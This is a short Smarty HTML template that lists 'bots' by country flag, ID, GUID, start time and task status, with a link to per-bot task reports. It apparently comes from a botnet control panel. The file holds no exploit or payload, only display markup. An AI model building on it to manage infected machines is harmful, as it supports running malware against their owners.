{if isset($BOTS)}
<br><hr color="#cccccc" size="1"><br>
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240); width: 600px;" border="1" cellpadding="3" cellspacing="0">
<th width='30'>#</th><th width='40'>Country</th><th width='40'>ID</th><th>GUID</th><th>Start time</th><th>Status</th><th style='width:16px'>Info</th>

{foreach from=$BOTS item=BOT name=bots}
	<tr>
	<td align='center'>{$smarty.foreach.bots.iteration}</td>
	<td align='center'><img src='img/flags/{$BOT.CCODE}.gif'></td>
	<td align='center'>{$BOT.id_bot}</td>
	<td align='center'>{$BOT.guid_bot}</td>
	<td align='center'>{$BOT.upStartTime}</td>
	<td align='center'><b>{if $BOT.upStatus==1}IN PROCESS{elseif $BOT.upStatus==3}OK{elseif $BOT.upStatus==2}ERROR{/if}</b></td>
	<td align='center'>
		<img src="./img/icos/info.png" title="Reports" onclick='load2("./mod/load_reports.php?lid={$BOT.upId}","task_report");'>
	</td>
	</tr>
{foreachelse}
	<tr><td colspan='5' class='error' align='center'>There are no bots</td></tr>
{/foreach}

</table>
{/if}

<div id='task_report'></div>